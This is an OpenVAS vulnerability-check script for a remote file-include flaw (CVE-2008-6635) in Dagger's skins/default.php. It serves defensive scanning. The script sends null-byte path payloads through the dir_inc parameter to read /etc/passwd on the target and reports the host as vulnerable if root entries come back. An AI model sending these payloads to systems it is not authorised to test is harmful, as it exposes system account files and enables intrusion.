###############################################################################
# OpenVAS Vulnerability Test
# $Id: dagger_remote_file_include.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# Dagger 'skins/default.php' Remote File Include Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Dagger is prone to a remote file-include vulnerability because it
  fails to sufficiently sanitize user-supplied data.

  An attacker can exploit this issue to execute malicious PHP code in
  the context of the webserver process. This may facilitate a
  compromise of the application and the underlying computer; other
  attacks are also possible.";

tag_solution = "Vendor updates are available. See http://labs.geody.com/dagger/ fore more 
  information.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100050");
 script_version("$Revision: 9350 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-03-16 12:53:50 +0100 (Mon, 16 Mar 2009)");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2008-6635");
 script_bugtraq_id(29906);
 script_name("Dagger 'skins/default.php' Remote File Include Vulnerability");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/29906");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)) exit(0);

foreach dir( make_list_unique( "/dagger", "/cms", cgi_dirs( port:port ) ) ) { 

  if( dir == "/" ) dir = "";
  url = string(dir, "/skins/default.php?dir_inc=/etc/passwd%00");
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
  if( buf == NULL )continue;

  if( egrep(pattern:"root:.*:0:[01]:.*", string: buf) ) {    
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  } else {
    #/etc/passwd could not be read, try the "joke" File ../etc/passwd. 
    url = string(dir, "/skins/default.php?dir_inc=../etc/passwd%00");
    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
    if( buf == NULL )continue;
	
    if ( egrep(pattern:"Hi, lamer!", string: buf) &&
         egrep(pattern:".*SMILE, YOU'RE ON CANDID CAMERA!.*", string: buf) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report ); # who is the lamer now?
      exit( 0 );
    }
  }  
}

exit( 99 );
